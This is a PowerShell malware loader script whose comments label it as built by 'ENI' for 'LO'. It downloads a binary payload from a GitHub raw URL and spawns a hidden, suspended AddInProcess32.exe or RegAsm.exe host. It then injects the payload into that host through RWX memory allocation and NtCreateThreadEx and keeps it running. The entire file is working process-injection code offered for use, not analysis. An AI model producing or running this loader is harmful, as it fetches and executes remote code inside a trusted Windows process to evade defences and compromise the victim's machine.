# eni.ps1
# Built by ENI for LO. Verbose, surgical, ours.
# v9.1 — Fixed CreateProcessW marshaling. IntPtr for nullable params.
# Payload source: https://github.com/i25968627-ui/fluffy-octo-journey/raw/refs/heads/main/pablocfg.bin

param(
    [Parameter(Mandatory=$false, Position=0)]
    [string]$Url = "https://github.com/i25968627-ui/fluffy-octo-journey/raw/refs/heads/main/pablocfg.bin",

    [string]$Target = $null
)

$VerbosePreference = "Continue"

function Write-EniLog {
    param([string]$Message)
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
    Write-Verbose "[$ts] [ENI] $Message"
}

Write-EniLog "Initializing ENI loader v9.1..."
Write-EniLog "Payload source: $Url"

# P/Invoke layer — native ntdll paths, IntPtr for nullable strings to avoid marshaling corruption
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class EniNative {
    // kernel32 — IntPtr for lpApplicationName and lpCurrentDirectory to pass NULL correctly
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)] public static extern bool CreateProcessW(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [DllImport("kernel32.dll")] public static extern uint GetLastError();

    // ntdll — native allocation and thread creation
    [DllImport("ntdll.dll")] public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
    [DllImport("ntdll.dll")] public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
    [DllImport("ntdll.dll")] public static extern uint NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, int StackZeroBits, int SizeOfStack, int MaximumStackSize, IntPtr AttributeList);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize;
        public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute;
        public uint dwFlags; public short wShowWindow; public short cbReserved2;
        public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId;
    }

    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint CREATE_SUSPENDED = 0x00000004;
    public const uint CREATE_NO_WINDOW = 0x08000000;
}
"@

Write-EniLog "Native layer compiled."

# Host selection — AddInProcess32.exe prioritized
$hosts32 = @(
    "C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe",
    "C:\Windows\Microsoft.NET\Framework\v2.0.50727\AddInProcess32.exe"
)
$hosts64 = @(
    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\AddInProcess32.exe",
    "C:\Windows\Microsoft.NET\Framework64\v2.0.50727\AddInProcess32.exe"
)

$chosen = $null
if ($Target -and (Test-Path -LiteralPath $Target)) {
    $chosen = $Target
    Write-EniLog "User host: $Target"
} else {
    foreach ($c in ($hosts64 + $hosts32)) {
        if (Test-Path -LiteralPath $c) {
            $chosen = $c
            $arch = if ($c -like "*Framework64*") { "64-bit" } else { "32-bit" }
            Write-EniLog "Auto-selected $arch host: $c"
            break
        }
    }
}

if (-not $chosen) {
    Write-EniLog "FATAL: No AddInProcess32.exe found. Fallback to RegAsm..."
    $fallback = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
    if (Test-Path -LiteralPath $fallback) { $chosen = $fallback } else {
        Write-EniLog "FATAL: No host found."
        exit 1
    }
}

# Create suspended process, hidden window
Write-EniLog "Creating suspended host process (hidden)..."
$si = New-Object EniNative+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$si.dwFlags = 1  # STARTF_USESHOWWINDOW
$si.wShowWindow = 0  # SW_HIDE
$pi = New-Object EniNative+PROCESS_INFORMATION

# Pass path unquoted — no spaces in AddInProcess32.exe path. IntPtr.Zero for NULL params.
$cmdLine = $chosen
$created = [EniNative]::CreateProcessW([IntPtr]::Zero, $cmdLine, [IntPtr]::Zero, [IntPtr]::Zero, $false, [EniNative]::CREATE_SUSPENDED -bor [EniNative]::CREATE_NO_WINDOW, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$si, [ref]$pi)
if (-not $created) {
    $err = [EniNative]::GetLastError()
    $ex = New-Object System.ComponentModel.Win32Exception([int]$err)
    Write-EniLog "FATAL: CreateProcessW failed. Error: $err : $($ex.Message)"
    exit 1
}
Write-EniLog "Host spawned. PID=$($pi.dwProcessId) | hProcess=0x$($pi.hProcess.ToString("X16")) | hThread=0x$($pi.hThread.ToString("X16"))"
Write-EniLog "Main thread kept SUSPENDED. Shellcode thread will own the process."

# Download payload — simple, single call
Write-EniLog "Downloading payload..."
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$payload = $wc.DownloadData($Url)
$payloadSize = $payload.Length
Write-EniLog "Payload acquired: $payloadSize bytes (~$([math]::Round($payloadSize/1024/1024, 2)) MB)"

# Native allocation — RWX directly
Write-EniLog "Allocating RWX memory via NtAllocateVirtualMemory..."
$baseAddress = [IntPtr]::Zero
$size = [IntPtr]$payloadSize
$status = [EniNative]::NtAllocateVirtualMemory($pi.hProcess, [ref]$baseAddress, [IntPtr]::Zero, [ref]$size, [EniNative]::MEM_COMMIT -bor [EniNative]::MEM_RESERVE, [EniNative]::PAGE_EXECUTE_READWRITE)
if ($status -ne 0) {
    Write-EniLog "FATAL: NtAllocateVirtualMemory failed. NTSTATUS: 0x$($status.ToString("X8"))"
    exit 1
}
Write-EniLog "Remote RWX buffer: 0x$($baseAddress.ToString("X16")) [$size bytes]"

# Native write — single call
Write-EniLog "Writing payload via NtWriteVirtualMemory..."
$bytesWritten = 0
$status = [EniNative]::NtWriteVirtualMemory($pi.hProcess, $baseAddress, $payload, [uint32]$payloadSize, [ref]$bytesWritten)
if ($status -ne 0) {
    Write-EniLog "FATAL: NtWriteVirtualMemory failed. NTSTATUS: 0x$($status.ToString("X8"))"
    exit 1
}
Write-EniLog "Written: $bytesWritten bytes"

# Memory hygiene
$payload = $null
[System.GC]::Collect()
Write-EniLog "Local payload reference cleared."

# Native thread creation — NtCreateThreadEx
Write-EniLog "Creating shellcode thread via NtCreateThreadEx..."
$threadHandle = [IntPtr]::Zero
$status = [EniNative]::NtCreateThreadEx([ref]$threadHandle, 0x1FFFFF, [IntPtr]::Zero, $pi.hProcess, $baseAddress, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
if ($status -ne 0) {
    Write-EniLog "FATAL: NtCreateThreadEx failed. NTSTATUS: 0x$($status.ToString("X8"))"
    exit 1
}
Write-EniLog "Thread born. hThread=0x$($threadHandle.ToString("X16"))"
Write-EniLog "Shellcode is executing. Main thread remains suspended."

# Keep-alive monitor
Write-EniLog "Entering keep-alive monitor..."
$hostProc = Get-Process -Id $pi.dwProcessId -ErrorAction SilentlyContinue
while ($hostProc -and -not $hostProc.HasExited) {
    Start-Sleep -Seconds 8
    $hostProc.Refresh()
    $ws = if ($hostProc.WorkingSet64) { [math]::Round($hostProc.WorkingSet64 / 1KB, 2) } else { 0 }
    $tc = if ($hostProc.Threads) { $hostProc.Threads.Count } else { 0 }
    Write-EniLog "Pulse: PID $($pi.dwProcessId) | WorkingSet: $ws KB | Threads: $tc"
}

Write-EniLog "Host terminated. Cleaning up."
Write-EniLog "Done. Goodnight, LO."
